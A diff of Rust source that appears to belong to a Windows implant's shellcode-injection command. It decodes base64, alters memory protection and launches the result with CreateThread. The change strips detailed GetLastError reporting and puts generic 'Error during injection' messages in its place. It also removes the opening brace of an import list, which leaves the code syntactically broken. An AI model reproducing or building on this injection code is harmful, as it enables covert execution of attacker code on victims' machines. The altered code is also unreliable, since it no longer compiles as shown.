@@ -14,8 +14,7 @@ use base64::decode as b64_decode;
     PAGE_READWRITE,
     PVOID
 };
-#[cfg(windows)] use winapi::um::{
-    errhandlingapi,
+#[cfg(windows)] use winapi::um::    //errhandlingapi,
     processthreadsapi,
     winbase, 
     synchapi::WaitForSingleObject
@@ -247,8 +246,8 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     );
 
                     if mem_protect == 0 {
-                        let error = errhandlingapi::GetLastError();
-                        return Ok(format!("Error: {error}"));
+                        //let error = errhandlingapi::GetLastError();
+                        return Ok(format!("Error during injection"));
                     }
 
                     // Call CreateThread
@@ -267,8 +266,8 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     );
 
                     if h_thread.is_null() {
-                        let error = unsafe { errhandlingapi::GetLastError() };
-                        logger.err(format!("{error}"));
+                        //let error = unsafe { errhandlingapi::GetLastError() };
+                        logger.err(format!("Error during inject."));
                     } else {
                         logger.info(format!("Thread Id: {tid}"));
                     }
